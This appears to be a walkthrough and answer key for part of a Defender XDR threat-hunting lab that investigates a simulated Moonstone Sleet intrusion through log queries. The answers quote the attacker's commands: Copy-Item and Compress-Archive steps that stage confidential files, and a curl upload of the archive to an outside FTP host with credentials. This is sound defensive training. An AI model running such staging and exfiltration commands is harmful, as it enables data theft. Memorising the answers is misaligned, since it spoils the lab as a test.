## Titan Shield: A showcase of Microsoft Defender XDR: Section 3: Perfectly Executed<br>
### **Summary**<br>
Now that we've identified how the attackers got in (phishing email), we need to figure out what they did once they got here.
<br><br>
The threat intelligence article mentions two malicious DLLs that may be included with the tank game: NVUnityPlugin.dll or Unityplayer.dll.
<br><br>
Don't have access to Defender XDR? Click here for a screenshot
<br><br>
Let's query our logs to see if either of those files show up in our environment.
<br><br>


**Q1. How many results did this query return?**<br><br>

```
FileCreationEvents
| where filename in~ ("nvunityplugin.dll","unityplayer.dll")
```
<br>

**Answer: 6**<br><br>

**Q2. What is the Sha256 hash of the file you found?**<br><br>

**Answer: 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38**<br><br>

**Q3. This hash is attributed in the Microsoft Defender XDR portal to which threat actor?**<br><br>

**Answer: Moonstone Sleet**<br><br>

**Q4. What is the full process_commandline executed using this domain?**<br><br>

```
ProcessEvents
| where process_commandline has "curl" and process_commandline  has_any ("mingeloem.com","matrixane.com")
```
<br>


**Answer: curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass**<br><br>


**Q5. What is the -Path argument provided to Compress-Archive?**<br><br>
First result returned.<br><br>

```
Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
```
<br>

**Answer: C:\StagingArea\**<br><br>

**Q6. What is the -Path argument provided to Copy-Item?**<br><br>

```
ProcessEvents
| where process_commandline has "StagingArea"
```
<br>
First result returned.<br><br>

```
Copy-Item -Path \\company_share\confidential\defense\project_omega\* -Destination C:\StagingArea\ -Recurse
```
<br>

**Answer: \\company_share\confidential\defense\project_omega\***<br><br>

**Q7. Type hooray to complete the Moonstone Sleet investigation!**<br><br>

**Answer: hooray**<br><br>
